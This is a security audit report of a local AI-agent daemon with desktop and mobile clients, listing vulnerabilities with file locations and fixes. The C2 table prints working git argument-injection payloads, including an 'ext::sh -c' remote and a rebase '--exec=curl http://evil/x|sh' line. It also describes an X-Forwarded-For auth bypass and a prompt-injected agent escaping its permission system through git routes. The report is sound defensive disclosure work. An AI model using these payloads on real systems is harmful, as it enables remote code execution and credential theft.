# Mainframe Security Audit — 2026-07-11

Scope: the daemon (`packages/core`), the Tauri and Electron desktop shells, and the
mobile client (`packages/mobile` submodule). Method: five parallel security passes
(auth/network, OS-interaction, native shells, mobile, cross-cutting) plus direct
verification of the critical findings against the source.

## Threat model (read this first)

The daemon is, by design, a **local code-execution engine**: it spawns CLI agents,
runs git, and reads/writes files on the developer's machine. It binds `127.0.0.1`
only (`server/index.ts:41`), so the *intended* remote surface is exactly one thing —
the **cloudflared tunnel** that lets the paired mobile app reach it. Auth is a
per-device HMAC bearer token.

Two trust decisions define the whole security posture:

1. **Remote (tunnel) callers must present a valid token.** The HTTP layer enforces
   this correctly (Express `trust proxy: 'loopback'`). The WebSocket layer does **not**
   (finding C1).
2. **Localhost callers are trusted without a token** (`middleware/auth.ts:27-30`).
   This means *every* route is reachable unauthenticated by any local process —
   including a prompt-injected CLI agent reading a hostile repo — and turns the
   git-route injection bugs (C2) into a permission-system escape.

The critical findings are the places where "reach the RCE engine" and "cross a trust
boundary" meet.

---

## CRITICAL

### C1 — WebSocket auth bypass via `X-Forwarded-For` spoofing → unauthenticated remote RCE
**`packages/core/src/server/websocket.ts:59-82`** (IP derivation at `62-70`, gate at `29-32`)

The WS upgrade handler derives the client IP by taking the **leftmost**
`X-Forwarded-For` entry:

```js
const ip = LOCALHOST_IPS.has(rawIp) && forwarded
  ? forwarded.split(',')[0].trim()   // ← attacker-controlled
  : rawIp;
if (isWsAuthRequired(ip, secret)) { /* require token */ }   // skipped when ip is loopback
```

Over the tunnel, cloudflared connects from `127.0.0.1` (so `rawIp` is loopback) and
**appends** the real client IP to any inbound `X-Forwarded-For`. An attacker who sends
`X-Forwarded-For: 127.0.0.1` produces `127.0.0.1, <realIP>`; the handler reads the
leftmost `127.0.0.1`, concludes "localhost," and **skips token validation entirely**.

The HTTP path is *not* vulnerable — Express `trust proxy: 'loopback'` correctly walks
XFF from the right and returns the real client IP. This is a **divergence bug**: two
transports parse the same header, the hand-rolled WS parser gets it backwards.

**Impact:** any attacker who knows the tunnel URL (a `*.trycloudflare.com` slug, or a
stable named-tunnel hostname) gets a fully unauthenticated WebSocket session. The WS
carries `message.send` (drive the agent), `subscribe`/`subscribe:file` (read all chat
content and watch files), and critically `permission.respond` with `behavior:'allow'`
— **auto-approving the agent's own tool/bash execution requests → remote code
execution on the developer's machine.**

**Fix:** stop trusting `X-Forwarded-For` for the localhost decision. Either require the
token unconditionally on the tunnel-facing WS whenever `AUTH_TOKEN_SECRET` is set, or
take the **rightmost** XFF entry adjacent to the trusted loopback hop (matching Express),
or read `CF-Connecting-IP`. Extract one shared `clientIp(req)` helper used by both HTTP
and WS so they cannot drift again. (Note: the unit tests exercise `isWsAuthRequired(ip,
secret)` with a clean `ip` — the bug lives in the *untested* XFF-derivation glue above
it.)

### C2 — Git route command injection via `ext::` transport and `--exec`/`--output` → RCE
**`server/routes/schemas.ts:146-162`** (unvalidated bodies) → **`git/git-service.ts`** (positional args)

The `gitBranchName` allowlist (`schemas.ts:138-141`) is applied to `name`/`newName`
but **not** to the sibling ref/remote fields. These reach `git` as positional
arguments with no `--`/`--end-of-options` guard (verified against bundled
`simple-git@3.36.0`, which only filters `--upload-pack`, and only in `fetchTask`):

| Route | Field | Sink | Exploit |
|-------|-------|------|---------|
| `POST …/git/push` | `remote` (`schemas.ts:154`) | `git().push(pushRemote, …)` (`git-service.ts:360`) | `{"remote":"ext::sh -c \"touch /tmp/pwned\""}` → `git push ext::…` runs the shell command |
| `POST …/git/pull` | `remote` (`:147-153`) | `git().fetch(pullRemote, …)` (`:312`) | `{"remote":"ext::sh -c cmd","branch":"main","localBranch":"x"}` |
| `POST …/git/rebase` | `branch` (`:156`) | `git().rebase([branch])` (`:395`) | `{"branch":"--exec=curl http://evil/x|sh"}` → git runs each `--exec` via shell |
| `POST …/git/delete-branch` | `name` split on `/` (`:158`) | `git push <remote> --delete …` (`git-service.ts:445-451`) | `{"name":"ext::sh -c cmd/x","remote":true}` |

`git`'s `ext::` transport (allowed by default for direct user invocation) executes an
arbitrary command; `git rebase --exec`/`git diff --output` are argument-injection
primitives. **All four are remote code execution** given a valid project id.

**Reachability:** (a) a **paired mobile device** holds a valid token and can POST these
over the tunnel; (b) a **local process or prompt-injected CLI agent** hits them
unauthenticated on localhost — a bash-denied agent can still run commands by POSTing to
the git route, escaping the permission system; (c) see H2 for the CSRF-reachable GET
variant.

**Fix (one pass closes the cluster):** route every branch/ref field in `schemas.ts`
through `gitBranchName`, and every remote field through a remote-*name* allowlist
(`^[a-zA-Z0-9._-]+$`, reject `::`, `/`, leading `-`); resolve remote names against
`git remote`. Add `--end-of-options` before ref positionals in `GitService` as
defense-in-depth.

---

## HIGH

### H1 — Plugin system is not a security boundary (capability model is theater)
**`plugins/manager.ts:220`, `plugins/context.ts:16-34`, `security/manifest-validator.ts:4-15`**

Plugins load via `this._require(entryPath)` — arbitrary in-process Node with full host
privileges. The capability `gated()` Proxy only restricts the injected `ctx` API; it does
nothing to stop a plugin from `require('node:fs')` / `require('node:child_process')`
directly. A plugin that declares **zero capabilities** (so it looks harmless in the
listing) can still read `~/.mainframe/config.json` (the `authSecret` → mint valid device
tokens), read other plugins' `data.db`, spawn processes, or exfiltrate over the network.
The `VALID_CAPABILITIES` list advertising `process:exec` / `http:outbound` implies an
enforcement that does not exist — a false sense of isolation.

**Fix:** either load plugins in a real isolate (`worker_threads`/subprocess with a
restricted API and no ambient `fs`/`child_process`), or drop the capability framing and
document plugins as fully-trusted code requiring manual vetting. Don't present manifest
capabilities as a sandbox.

### H2 — `git diff` writes arbitrary files via `--output` (CSRF-reachable GET)
**`server/routes/git.ts:117-166`** (`GitDiffQuery.base`, `git.ts:23`)

`base` is unvalidated and concatenated *before* the `--` separator:
`diffArgs = [`${base}..HEAD`, '--', file]`. `?base=--output=/Users/you/.zshenv` →
`git diff --output=/Users/you/.zshenv..HEAD -- …`, writing to an attacker-influenced
path. Because this is a **GET** (a CORS "simple request"), it executes server-side even
when triggered cross-origin from any website the developer visits — CORS hides the
response but not the write. Chains toward RCE by overwriting shell rc files or a
`.mainframe/launch.json`.

**Fix:** validate `base` as a ref (allowlist/SHA) and keep it after `--end-of-options`.

### H3 — `POST /api/tunnel/start` exposes the daemon even when auth is unconfigured
**`server/routes/tunnel.ts:36-80`**

The tunnel-start route never checks that `AUTH_TOKEN_SECRET` is set. When it isn't, all
auth fails open (`middleware/auth.ts:22`, `isWsAuthRequired` returns `false`), so starting
a tunnel publishes the **entire daemon unauthenticated to the internet**. In production
`index.ts:65-66` always sets the secret before serving, so this is latent today — but
`/api/auth/pair` already refuses when no secret exists and this route does not, so any
alternate entry point or packaging regression that skips the wiring is a full exposure.

**Fix:** in `tunnel/start`, reject with 400 "Auth not configured" when the secret is
falsy, mirroring the pair route. Consider making the middleware fail **closed** for
non-loopback callers.

### H4 — `open_external` reachable by remote preview webviews, broad scheme allowlist
**`capabilities/preview.json:6-14`, `src/preview/bridge_plugin.rs:22-32`, `src/preview/mod.rs:73-85`**

`open_external` is granted to **remote (semi-untrusted) preview webviews** and forwards a
wide scheme allowlist (`vscode`, `cursor`, `jetbrains`, `zed`, `slack`, `figma`, `linear`,
`notion`, `discord`, + `http/https/mailto/tel`) plus a `https://*.trycloudflare.com`
**wildcard** (a shared public domain — any attacker quick-tunnel matches). It's callable
programmatically (no user click required). JS in a previewed page can silently launch IDE
deep-link handlers (several have had workspace-open/RCE-class abuses) or open arbitrary
`https://` phishing targets.

**Fix:** for preview-origin callers restrict `open_external` to `http`/`https`/`mailto`
only; scope the tunnel grant to the exact configured URL, not `*.trycloudflare.com`;
require a user gesture for non-web schemes.

### H5 — Tauri `read_file` confines only to `$HOME` (reads ssh keys, cloud creds, the daemon secret)
**`src/commands/fs.rs:5-13,58-86`**

`read_file` / `read_file_base64` validate only "under `$HOME`" — a regression from
Electron's `~/.claude`/`~/.mainframe`/data-dir allowlist (`ipc-handlers.ts:35-43`). The
renderer can read `~/.ssh/id_rsa`, `~/.aws/credentials`, and `~/.mainframe/config.json`
(the `authSecret`). Combined with the very broad `connect-src … https: wss:` CSP
(`tauri.conf.json`), any renderer XSS or compromised UI dependency becomes a
secret-exfiltration chain. Precondition (renderer compromise) is mitigated by
`script-src 'self'`, so this is defense-in-depth — but the home-wide grant is concrete
attack surface.

**Fix:** confine `read_file*` to the project roots + data dir actually needed, or at
minimum deny `~/.ssh`, `~/.aws`, `~/.gnupg`, and `<data_dir>/config.json` even within
home. Tighten `connect-src` toward the specific daemon host(s).

---

## MEDIUM

- **Adapter executablePath is a network-reachable spawn sink.** `PUT
  /api/settings/providers/:adapterId` (`routes/settings.ts:151-217`) writes an arbitrary
  `executablePath` from the body, later spawned as the adapter binary
  (`adapters/resolve-executable.ts:51`). `adapterId` isn't validated against
  `^[a-zA-Z0-9_-]+$`. A paired device (or localhost caller) sets it to any binary → exec
  on next session. *Fix:* validate `adapterId`; treat this route as "run this binary."

- **`POST /api/projects` accepts any path as a project base.** `CreateProjectBody.path`
  (`schemas.ts:7`) is only `min(1)`; stored verbatim and used as git root / spawn cwd /
  file-read base. A paired device can register `/` or another user's home, widening its
  filesystem reach. *Fix:* require absolute + exists + directory (ideally a git repo /
  allowlisted root).

- **Arbitrary file read under `~/.claude`.** `GET …/files` falls back to
  `resolveClaudeConfigPath` (`path-utils.ts:48-74`), serving anything under `~/.claude`
  regardless of project — including `~/.claude/.credentials.json` (Anthropic OAuth token)
  and MCP tokens. Unauthenticated on localhost. *Fix:* restrict the fallback to `plans/`,
  `skills/`; deny dotfiles/`.credentials.json`.

- **`GET /api/files/external` is a broad arbitrary-read primitive.** Only a 3-prefix/
  4-pattern blocklist (`files.ts:380-393`) guards it; misses `~/.aws/config`, `~/.npmrc`,
  `.env`, `~/.config/gh/hosts.yml`, browser cookie DBs, etc. *Fix:* make it an allowlist
  (picker-confirmed / opened-file registry), or require authed context even on localhost.

- **Skills routes: arbitrary-dir delete via symlink + unvalidated `projectPath`.**
  `deleteSkill` (`plugins/builtin/claude/skills.ts:211-219`) does
  `rm(dirname(skill.filePath), {recursive,force})` after realpath-resolving a `SKILL.md`
  that may be a symlink → deletes the link target's parent; `projectPath` is a raw string
  (not checked against registered projects), and `createSkill` writes attacker content to
  `<anyPath>/.claude/skills/<name>/SKILL.md` (auto-loaded by the CLI). *Fix:* validate
  `projectPath` against `ctx.db.projects`; confirm the resolved dir is contained under
  `<projectPath>/.claude/skills` before removing; don't follow symlinks.

- **File-watch containment bypass (arbitrary-file existence/realpath oracle).**
  `resolveSubscribePath` (`server/ws-file-watch.ts:29-31`) returns any path starting with
  `/` verbatim, skipping `resolveAndValidatePath`. `subscribe()` realpath+stats it and acks
  the resolved absolute path, then `fs.watch`es it. Leaks home-dir layout / usernames /
  file existence and monitors changes on any file. On its own an authed leak; **via C1 it's
  a remote unauthenticated oracle.** *Fix:* run absolute paths through
  `resolveAndValidatePath(base, path)` too.

- **[mobile] WS bearer token in the URL query string.** `lib/daemon-client.ts:41` sends
  `?token=…`; the daemon reads it at `websocket.ts:74`. Full request URLs (with the token)
  are routinely captured in Cloudflare edge/access logs and any intermediary — a
  long-lived device token leaks into logs. *Fix:* send the token in an `Authorization`
  header (RN `WebSocket` supports a headers option); accept the query param only for
  loopback.

- **[mobile] No TLS enforcement; cleartext `http://` accepted and mislabeled "Encrypted."**
  `normalizeUrl` only *defaults* a scheme-less host to `https` and never rejects `http://`
  (`app/welcome.tsx:42`, `AddServerSheet.tsx:63`, `lib/auth.ts:26-27`); `daemon-client.ts:40`
  then derives `ws://`, carrying the token in cleartext, while `AddServerSheet.tsx:157`
  unconditionally says "Encrypted over your Cloudflare tunnel." iOS blocks public-hostname
  cleartext but still allows IP-literal hosts. *Fix:* reject non-`https` for non-loopback
  targets at input; gate the "Encrypted" copy on a verified `https`/`wss` connection.

- **[mobile] iOS distribution-cert password committed to git history.** `credentials.json`
  at commit `74d9c14` (mobile submodule) contains
  `ios.distributionCertificate.password` in plaintext; removed from the tree in
  `d019f85`/`6f01d4f` but recoverable via `git show 74d9c14:credentials.json`. The `.p12`
  / `.mobileprovision` blobs were never committed and the repo is private, bounding blast
  radius. *Fix:* rotate the cert password, purge the blob from history (git-filter-repo /
  BFG), keep signing creds in EAS-managed credentials only.

- **[tauri] Preview bridge trusts page-supplied `tabId`.** `src/preview/bridge.rs`
  callbacks route by `window.__mfPreviewTabId`, freely overwritable by the remote page →
  one previewed page can spoof another tab's address bar / inject fake inspect/region
  payloads. *Fix:* derive tab identity from the invoking webview label server-side.

---

## LOW / hardening

- **WS has no DoS bounds** (`websocket.ts:54`): no `maxPayload` (ws default 100 MiB), no
  concurrent-connection cap, no inbound rate limit, no per-client file-watch cap → memory /
  FD exhaustion over the tunnel. Set `maxPayload` (~1 MiB), cap connections + subscriptions,
  add a token bucket.
- **`/health` leaks `pid` + `tunnelUrl`** unauthenticated (`http.ts:102-112`) — daemon
  fingerprint. Drop the verbose fields or gate them on loopback.
- **DNS-rebinding hardening**: add a `Host`/`Origin` check for request *processing* (not
  just the CORS response header) so a rebinding page can't fire simple GETs at the daemon
  regardless of the localhost-trust model (`cors-origin.ts`, `http.ts:82-95`).
- **`DELETE /api/auth/devices/:deviceId`** (`routes/auth.ts:223-228`): no ownership/self
  check, `deviceId` unvalidated — any paired device can unpair any other. Scope to the
  authed device / require loopback.
- **Tokens never expire** (`auth/token.ts`): `iat` is recorded but no max-age is enforced;
  revocation is epoch-bump / device-removal only. Consider a max token age.
- **`dompurify` moderate mXSS advisories** — relevant if the UI sanitizes model/markdown
  output; bump it. (Full `pnpm audit --prod`: 0 critical / 4 high / 31 moderate; the rest
  are dev-server or transitive Express ReDoS, negligible for the shipped daemon.)
- **Tunnel error text returned to client** (`tunnel.ts:77-78`) — minor internal-path
  disclosure; return generic + log via pino.
- **[electron] `webviewTag:true` with no `will-attach-webview` handler**
  (`src/main/index.ts:143`) — add one that strips `preload`, forces
  `nodeIntegration:false`/`contextIsolation:true`, validates `src`.
- **[tauri] `object-src blob:`** in the main CSP appears unused (viewers render via
  `<img>`) — set `object-src 'none'`.
- **[mobile] Android cleartext not explicitly disabled** — set
  `expo.android.usesCleartextTraffic:false`.
- **[mobile] push `data.chatId` interpolated into a route** (`lib/notifications.ts:74`)
  without validation — validate against `^[a-zA-Z0-9_-]+$`.
- **[mobile] Markdown/WebView render semi-trusted content** without an `onLinkPress`
  guard / `originWhitelist` — restrict to `https`/`mailto` and the expected tunnel origin.

---

## What's solid (don't regress these)

- **Auth crypto:** HMAC-SHA256 tokens, `timingSafeEqual` with a length guard
  (`auth/token.ts:24-26`), epoch-based revocation (`validate-authed-token.ts`).
- **Daemon binds `127.0.0.1` only** — no `0.0.0.0` exposure; the tunnel is the sole
  intended remote ingress.
- **HTTP client-IP handling is correct** — Express `trust proxy: 'loopback'` (the WS path
  should copy it).
- **SQL is fully parameterized**; dynamic SQL builds placeholders from array length with
  hardcoded column names. **No mass assignment** — `ChatsRepository.update` maps through a
  static allowlist.
- **Path containment** (`resolveAndValidatePath` / `isWithinBase`) is realpath +
  separator-guarded prefix, consistently applied to the project file API; ripgrep pushes
  `--` before the query/scope (`ripgrep.ts:92,156`); LSP commands are hardcoded; adapter
  spawn uses separate argv elements with no `shell` on non-Windows.
- **Zod coverage** is thorough across routes and WS messages (discriminated union); the
  command name is constrained to `^[a-zA-Z0-9_-]+$` at the stdin seam.
- **Tauri:** remote-webview → app-command isolation is correctly designed (preview
  capability grants only the 4 bridge permissions; `terminal_*`/`preview_eval`/`read_file`
  are main-window only); the **auto-updater enforces minisign signature verification over
  HTTPS**; dev-only surfaces (mcp-bridge, `withGlobalTauri`, remote-debugging) are compiled
  out of release; tokens live in the OS keyring / `safeStorage`.
- **Mobile:** all tokens + device UUID in `expo-secure-store` (Keychain/Keystore), never
  AsyncStorage; device id is `Crypto.randomUUID()`; no token logging; no deep-link
  injection path; `.p12`/`.mobileprovision`/`.env` gitignored.
- **No hardcoded secrets** in either repo; deserialization sites are try/catch-guarded
  with safe fallbacks; workflow credential store persists at `0600`.

---

## The two-line remediation that removes the most risk

1. **Unify client-IP derivation** — one `clientIp()` helper shared by HTTP and WS, using
   the rightmost-trusted-hop rule; require the token on the tunnel-facing WS. (Closes C1.)
2. **Apply the `gitBranchName` allowlist to every ref/remote field in `schemas.ts`** and
   add `--end-of-options` in `GitService`. (Closes C2 + H2 + the arg-injection cluster.)

After those, tackle H1 (plugin isolation) and H3 (fail-closed auth) as the next tier.
